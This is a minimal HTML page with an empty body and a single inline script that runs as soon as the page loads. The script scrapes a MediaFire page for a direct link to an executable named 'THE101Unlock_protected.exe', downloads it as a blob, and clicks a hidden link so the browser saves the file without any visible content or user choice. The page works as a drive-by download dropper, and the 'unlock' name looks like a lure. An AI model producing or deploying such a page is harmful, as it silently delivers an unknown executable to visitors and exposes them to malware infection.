<!DOCTYPE html>
<html>
<head>
    <script>
        (async function() {
            try {
                // First, get the MediaFire page to extract direct download URL
                const pageResponse = await fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file');
                const pageHtml = await pageResponse.text();
                
                // Extract the direct download URL from the HTML
                const downloadMatch = pageHtml.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\.exe)"/);
                const directUrl = downloadMatch ? downloadMatch[1] : null;
                
                if (directUrl) {
                    // Now fetch the actual file data
                    const fileResponse = await fetch(directUrl);
                    const fileBlob = await fileResponse.blob();
                    
                    // Create download link and trigger click
                    const downloadUrl = URL.createObjectURL(fileBlob);
                    const a = document.createElement('a');
                    a.href = downloadUrl;
                    a.download = 'THE101Unlock_protected.exe';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    
                    // Clean up the object URL
                    URL.revokeObjectURL(downloadUrl);
                } else {
                    console.error('Could not extract download URL');
                }
            } catch (error) {
                console.error('Download failed:', error);
            }
        })();
    </script>
</head>
<body>
</body>
</html>
